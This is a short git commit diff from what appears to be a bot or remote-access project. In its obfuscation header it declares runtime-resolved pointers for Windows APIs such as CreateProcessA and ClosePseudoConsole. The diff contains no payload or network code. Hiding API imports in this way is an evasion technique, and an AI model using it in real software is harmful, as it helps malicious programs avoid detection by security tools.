414ca7317de34250a7272406a5cefdbc4418bf23
CPunch <sethtstubbs@gmail.com>
2022-07-08 16:12:27 -0500

    Bot: More APIs added to laikaO_init()
    - Misc. functions converted to their UTF-8 version
    - ClosePseudoConsole & CreateProcessA are now manually 'linked' during runtime

--- bot/include/obf.h
+++ bot/include/obf.h
@@ -10,9 +10,13 @@
 /* WINAPI types */
 typedef HINSTANCE(WINAPI *_ShellExecuteA)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
 typedef HRESULT(WINAPI *_CreatePseudoConsole)(COORD, HANDLE, HANDLE, HPCON *);
+typedef void(WINAPI *_ClosePseudoConsole)(HPCON);
+typedef BOOL(WINAPI *_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
 
 extern _ShellExecuteA oShellExecuteA;
 extern _CreatePseudoConsole oCreatePseudoConsole;
+extern _ClosePseudoConsole oClosePseudoConsole;
+extern _CreateProcessA oCreateProcessA;
 #endif
 
 void laikaO_init();
